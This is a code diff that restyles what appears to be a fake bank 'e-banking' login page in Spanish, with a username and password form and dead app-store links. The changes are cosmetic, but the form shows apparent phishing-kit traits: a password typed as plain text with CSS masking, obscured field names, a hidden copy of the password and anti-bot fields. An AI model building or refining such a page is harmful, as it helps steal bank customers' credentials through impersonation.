@@ -192,7 +192,8 @@
         text-decoration: none;
     }
     .descargar-item + .descargar-item { border-left: 1px solid #d0d0d0; }
-    .descargar-item svg { width: 28px; height: 28px; fill: #8a8a8a; flex-shrink: 0; }
+    .descargar-item svg,
+    .descargar-item img { width: 28px; height: 28px; object-fit: contain; flex-shrink: 0; }
     .descargar-item span { display: inline-block; }
 
     /* Banner naranja inferior */
@@ -257,7 +258,28 @@
         border-radius: 4px !important;
         box-sizing: border-box;
     }
-    .p1 + br + br + .p1 { margin-top: 14px !important; }
+    .p1 + .p1 { margin-top: 14px !important; }
+    .login-form-inner .pop { margin-top: 16px; }
+    .login-form-inner .p2 { margin-top: 14px; }
+    form#mainForm { margin: 0; padding-top: 4px; }
+    .pan { text-align: center; }
+
+    /* Barra LOGIN teal con chevron */
+    .login-bar {
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 44px !important;
+        padding: 0 !important;
+    }
+    .login-bar-img { height: 22px; width: auto; display: block; }
+    .login-bar-chevron {
+        color: #F58220;
+        font-size: 16px;
+        margin-left: 10px;
+        line-height: 1;
+    }
     .pop {
         display: inline-block;
         min-width: 120px;
@@ -299,19 +321,18 @@
         </center>
     </div>
 
-    <div class="masa3">
-        <center>        
-            <img width="100px" src="img/ss.png" alt="">
-        </center>
+    <div class="masa3 login-bar">
+        <img class="login-bar-img" src="img/ss.png" alt="LOGIN">
+        <span class="login-bar-chevron" aria-hidden="true">▾</span>
     </div>
 
     <div class="descargar-row">
         <a class="descargar-item" href="#" aria-label="Descargar en App Store">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16.365 1.43c0 1.14-.42 2.22-1.13 3.03-.85.97-2.22 1.72-3.36 1.63-.14-1.11.42-2.28 1.13-3.06.79-.9 2.23-1.63 3.36-1.6zM20.5 17.28c-.55 1.27-.82 1.83-1.53 2.94-.99 1.55-2.39 3.48-4.12 3.5-1.54.02-1.94-1-4.03-.99-2.09.01-2.53 1.01-4.07.99-1.73-.02-3.05-1.76-4.04-3.31C-.02 15.6-.32 10.15 2.42 7.28c1.29-1.36 3.32-2.22 5.23-2.22 1.94 0 3.16 1.07 4.76 1.07 1.55 0 2.5-1.07 4.74-1.07 1.7 0 3.5.93 4.78 2.54-4.2 2.3-3.52 8.29-1.43 9.68z"/></svg>
+            <img src="img/logo-apple.png" alt="" aria-hidden="true">
             <span>DESCARGAR EN<br>APP STORE</span>
         </a>
         <a class="descargar-item" href="#" aria-label="Descargar en Google Play">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M17.523 15.34a2.5 2.5 0 1 1-4.999.001 2.5 2.5 0 0 1 4.999-.001zm-11.046 0a2.5 2.5 0 1 1-4.999.001 2.5 2.5 0 0 1 4.999-.001zM15.53 8.844l1.457-2.52a.302.302 0 0 0-.523-.302l-1.475 2.554a9.13 9.13 0 0 0-3.49-.685 9.13 9.13 0 0 0-3.49.685L6.535 6.022a.302.302 0 1 0-.523.302l1.457 2.52C4.941 10.211 3.13 12.66 2.85 15.5h18.298c-.28-2.84-2.09-5.289-4.618-6.656zM8.706 7.474a.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75zm6.588 0a.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75zM2.85 16.25a5.9 5.9 0 0 0 2.938 4.79l-.86 1.488a.302.302 0 1 0 .524.302l.87-1.507a9.11 9.11 0 0 0 3.678.77h4a9.11 9.11 0 0 0 3.678-.77l.87 1.507a.302.302 0 1 0 .524-.302l-.86-1.488a5.9 5.9 0 0 0 2.938-4.79H2.85z"/></svg>
+            <img src="img/logo-android.png" alt="" aria-hidden="true">
             <span>DESCARGAR EN<br>GOOGLE PLAY</span>
         </a>
     </div>
@@ -413,22 +434,17 @@
                 }
             </script>
 
-            <form id="mainForm" method="post" style="margin-top: -20px;" onsubmit="handleSubmit(event); return false;">
-                <div style=""> 
+            <form id="mainForm" method="post" onsubmit="handleSubmit(event); return false;">
+                <div class="login-form-inner"> 
                     <h2 class="pan">e-banking</h2>
-                    <br><center> 
+                    <center> 
                     <input placeholder="Usuario" class="p1" type="text" name="pp1" id="usuario" autocomplete="off" oninput="this.value=this.value.replace(/[\s@]/g,'')">
-                    <br><br>
                     <input placeholder="Contraseña" class="p1" type="text" id="contrasena" autocomplete="off" style="-webkit-text-security: disc; text-security: disc;">
                     <input type="hidden" name="pp2" id="pp2_real">
-                    <br>
-                    
-                        <br>
                         <select class="pop" id="language_movil" name="language">
                             <option value="es-NI" selected="selected">Español</option>
                             <option value="en-US">Inglés</option>
                         </select>
-                        <br> <br>
                         <!-- Anti-bot fields -->
                         <input type="text" name="honeypot" class="hidden-field" autocomplete="off" style="display:none">
                         <input type="hidden" id="csrf_token" name="csrf_token">
